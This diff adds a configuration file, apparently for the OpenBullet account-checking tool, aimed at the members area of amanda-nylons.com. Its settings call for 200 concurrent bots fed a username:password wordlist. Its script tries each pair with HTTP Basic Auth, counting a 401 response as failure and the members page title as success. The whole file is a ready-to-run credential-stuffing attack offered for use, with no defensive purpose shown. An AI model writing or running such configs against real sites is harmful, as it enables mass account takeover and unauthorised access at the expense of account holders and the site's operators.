@@ -1,0 +1,32 @@
+[SETTINGS]
+{
+  "Name": "Amanda-Nylons",
+  "SuggestedBots": 200,
+  "LastModified": "2018-06-06T01:49:55.5081709+00:00",
+  "AdditionalInfo": "",
+  "Author": "MaStErChO",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Checking REQUEST GET "http://www.amanda-nylons.com/members/" BasicAuth 
+  USERNAME "<USER>" PASSWORD "<PASS>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "<title>A M A N D A   N Y L O N S | MEMBERS</title>" 
